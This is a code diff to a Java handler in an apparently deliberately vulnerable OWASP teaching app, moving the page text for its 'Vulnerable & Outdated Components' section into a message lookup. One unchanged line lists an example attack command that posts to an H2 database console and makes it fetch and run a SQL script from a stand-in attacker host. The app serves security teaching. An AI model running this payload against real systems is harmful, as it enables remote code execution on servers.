@@ -1,5 +1,6 @@
 package com.owasp.demo.controller;
 
+import com.owasp.demo.util.Messages;
 import com.owasp.demo.view.TemplateEngine;
 import jakarta.servlet.http.HttpServletRequest;
 import jakarta.servlet.http.HttpServletResponse;
@@ -36,12 +37,8 @@ public class VulnerableComponentsHandler implements IRouteHandler {
         }
 
         String info = TemplateEngine.infoBox(
-            "Applications that use components with known public CVEs inherit those vulnerabilities. " +
-            "Most supply-chain attacks exploit unpatched transitive dependencies that developers " +
-            "are not even aware of.",
-            "Maintain an SBOM (software bill of materials). Run <code>dependency-check</code> or " +
-            "GitHub Dependabot in CI. Subscribe to CVE feeds for your runtime and framework. " +
-            "Pin versions and upgrade regularly."
+            Messages.get("vuln-components.info.explanation"),
+            Messages.get("vuln-components.info.mitigation")
         );
 
         String table = """
@@ -76,8 +73,8 @@ public class VulnerableComponentsHandler implements IRouteHandler {
              "curl -s -X POST http://target/h2-console/login.do -d \"url=jdbc:h2:mem:testdb;INIT=RUNSCRIPT+FROM+'http://attacker/cmd.sql'&user=sa&password=\""},
         });
 
-        String content = TemplateEngine.vulnerabilityBadge("A06", "Vulnerable & Outdated Components", "Components")
+        String content = TemplateEngine.vulnerabilityBadge(Messages.get("vuln-components.badge.id"), Messages.get("vuln-components.badge.name"), Messages.get("vuln-components.badge.tag"))
             + info + exploits + table;
-        res.getWriter().write(TemplateEngine.page("Vulnerable Components", content, true));
+        res.getWriter().write(TemplateEngine.page(Messages.get("vuln-components.title"), content, true));
     }
 }
